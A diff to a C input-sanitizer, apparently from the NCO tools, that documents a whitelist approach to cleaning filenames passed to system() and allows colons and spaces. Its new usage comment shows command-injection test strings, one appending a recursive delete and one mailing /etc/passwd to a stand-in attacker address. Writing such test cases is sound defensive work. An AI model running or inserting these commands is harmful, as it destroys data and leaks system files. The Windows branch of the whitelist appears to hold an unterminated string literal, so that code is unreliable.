@@ -1,6 +1,13 @@
 /* Purpose: Sanitize user-input data passed to system() calls
+
+   cc -o ${MY_BIN_DIR}/sanitize ~/sw/c/sanitize.c
+
    Usage:
-   cc -o ${MY_BIN_DIR}/sanitize ~/sw/c/sanitize.c */
+   sanitize in.nc
+   sanitize 'in.nc;'
+   sanitize '/path/to/in.nc;/bin/rm -r -f *'
+   sanitize '/path/to/in.nc;cat /etc/passwd | mail hacker@badguy.net'
+   sanitize '/path/to/in.nc; blacklist: ;|<>[](),*' */
 
 #include <stdio.h> /* stderr, FILE, NULL, etc. */
 #include <stdlib.h> /* atof, atoi, malloc, getopt */
@@ -9,17 +16,24 @@
 
 int main(int argc,char *argv[]){
   
-/* Algorithm based on:
-   https://wiki.sei.cmu.edu/confluence/display/c/STR02-C.+Sanitize+data+passed+to+complex+subsystems */
+/* Whitelist algorithm based on:
+   https://wiki.sei.cmu.edu/confluence/display/c/STR02-C.+Sanitize+data+passed+to+complex+subsystems 
+   NCO modifications to whitelist:
+   20180214: Allow colons (WRF filenames sometimes have timestamps with colons, Windows drive labels have colons) 
+   20180214: Allow spaces? (Methinks some Windows people do have data files with spaces)
+   20180214: Allow forward slash on UNIX, backslash on Windows (path separators) 
+   Crucial characters that are implicitly blacklisted (and could be transformed into underscores) are:
+   ";|<>[](),*" */
   static char wht_lst[]="abcdefghijklmnopqrstuvwxyz"
     "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
     "1234567890_-.@"
+    " :"
 #ifndef _MSC_VER
     "/";
 #else /* !_MSC_VER */
     "\";
 #endif /* !_MSC_VER */
-
+  /* ": re-balance syntax highlighting */
   char *fl_in=NULL; /* [sng] Input file */
   char *fl_out=NULL; /* [sng] Output file */
 
